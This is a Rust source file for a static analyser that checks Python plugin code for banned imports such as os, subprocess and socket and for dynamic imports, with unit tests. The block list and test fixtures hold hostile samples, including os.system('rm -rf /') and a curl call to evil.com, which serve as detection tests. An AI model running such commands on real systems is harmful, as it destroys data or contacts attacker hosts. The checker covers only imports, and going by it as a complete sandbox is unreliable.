//! Gatekeeper: Static Analysis for Python Plugins
//!
//! Validates Python source code using AST analysis to prevent:
//! - Execution of dangerous system calls
//! - Import of banned modules
//! - Use of restricted language features
//!
//! **Design Philosophy:**
//! Static analysis in Rust, not runtime validation in Python.
//! Zero-dependency on Python interpreter for security checks.

use anyhow::{Context, Result};
use rustpython_ast::Visitor;
use rustpython_parser::{ast, Parse};
use std::collections::HashSet;

/// Banned modules that plugins are not allowed to import
const BANNED_MODULES: &[&str] = &[
    "os",
    "subprocess",
    "sys",
    "shutil",
    "socket",
    "ctypes",
    "multiprocessing",
    "__import__",
    "importlib",
];

/// Gatekeeper validates Python source code for security violations
pub struct Gatekeeper {
    banned_modules: HashSet<String>,
}

impl Default for Gatekeeper {
    fn default() -> Self {
        Self::new()
    }
}

impl Gatekeeper {
    /// Create a new Gatekeeper with default banned modules
    pub fn new() -> Self {
        Self {
            banned_modules: BANNED_MODULES.iter().map(|s| s.to_string()).collect(),
        }
    }

    /// Validate Python source code
    ///
    /// Returns `Ok(())` if code passes validation, or `Err` with a list of violations.
    pub fn validate(&self, source_code: &str) -> Result<()> {
        // Parse the Python source code into an AST
        let ast = ast::Suite::parse(source_code, "<plugin>")
            .context("Failed to parse Python source code")?;

        let mut visitor = GatekeeperVisitor::new(&self.banned_modules);
        for stmt in ast {
            visitor.visit_stmt(stmt);
        }

        if visitor.violations.is_empty() {
            Ok(())
        } else {
            anyhow::bail!(
                "Security validation failed:\n{}",
                visitor.violations.join("\n")
            )
        }
    }
}

struct GatekeeperVisitor<'a> {
    banned_modules: &'a HashSet<String>,
    violations: Vec<String>,
}

impl<'a> GatekeeperVisitor<'a> {
    fn new(banned_modules: &'a HashSet<String>) -> Self {
        Self {
            banned_modules,
            violations: Vec::new(),
        }
    }

    fn check_import(&mut self, module_name: &str, context: &str) {
        if self.banned_modules.contains(module_name) {
            self.violations
                .push(format!("Banned import: '{} {}'", context, module_name));
        }
    }

    fn check_dynamic_import(&mut self, func: &ast::Expr) {
        if let Some(name) = dynamic_import_name(func) {
            self.violations
                .push(format!("Banned dynamic import: '{}'", name));
        }
    }
}

fn dynamic_import_name(func: &ast::Expr) -> Option<String> {
    match func {
        ast::Expr::Name(name) => {
            if name.id.as_str() == "__import__" {
                Some("__import__".to_string())
            } else {
                None
            }
        }
        ast::Expr::Attribute(attr) => {
            let attr_name = attr.attr.as_str();
            match attr_name {
                "import_module" | "reload" => {
                    if let ast::Expr::Name(value) = attr.value.as_ref() {
                        if value.id.as_str() == "importlib" {
                            return Some(format!("importlib.{}", attr_name));
                        }
                    }
                }
                "__import__" => {
                    if let ast::Expr::Name(value) = attr.value.as_ref() {
                        let name = value.id.as_str();
                        if name == "builtins" || name == "__builtins__" {
                            return Some(format!("{}.{}", name, attr_name));
                        }
                    }
                }
                _ => {}
            }
            None
        }
        _ => None,
    }
}

impl<'a> Visitor for GatekeeperVisitor<'a> {
    fn visit_stmt_import(&mut self, node: ast::StmtImport) {
        for alias in &node.names {
            self.check_import(alias.name.as_str(), "import");
        }
        self.generic_visit_stmt_import(node);
    }

    fn visit_stmt_import_from(&mut self, node: ast::StmtImportFrom) {
        if let Some(module) = &node.module {
            self.check_import(module.as_str(), "from");
        }
        self.generic_visit_stmt_import_from(node);
    }

    fn visit_expr_call(&mut self, node: ast::ExprCall) {
        self.check_dynamic_import(&node.func);
        self.generic_visit_expr_call(node);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_valid_code() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import pandas as pd
import pyarrow as pa

class Handler:
    def execute(self, file_path):
        df = pd.read_csv(file_path)
        return pa.Table.from_pandas(df)
"#;
        assert!(gatekeeper.validate(code).is_ok());
    }

    #[test]
    fn test_banned_import_os() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import os

class Handler:
    def execute(self, file_path):
        os.system("rm -rf /")
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'import os'"));
    }

    #[test]
    fn test_banned_import_subprocess() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
from subprocess import run

class Handler:
    def execute(self, file_path):
        run(["curl", "evil.com"])
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'from subprocess'"));
    }

    #[test]
    fn test_banned_import_in_function() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import pandas as pd

class Handler:
    def execute(self, file_path):
        import socket  # Evil nested import
        return pd.DataFrame()
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned import: 'import socket'"));
    }

    #[test]
    fn test_multiple_violations() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
import os
from subprocess import run
import socket
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("import os"));
        assert!(err.contains("from subprocess"));
        assert!(err.contains("import socket"));
    }

    #[test]
    fn test_banned_dynamic_import_dunder() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
class Handler:
    def execute(self, file_path):
        __import__("os")
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned dynamic import: '__import__'"));
    }

    #[test]
    fn test_banned_dynamic_import_importlib() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
class Handler:
    def execute(self, file_path):
        importlib.import_module("os")
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Banned dynamic import: 'importlib.import_module'"));
    }

    #[test]
    fn test_invalid_python_syntax() {
        let gatekeeper = Gatekeeper::new();
        let code = r#"
def invalid syntax here
"#;
        let result = gatekeeper.validate(code);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("Failed to parse"));
    }
}
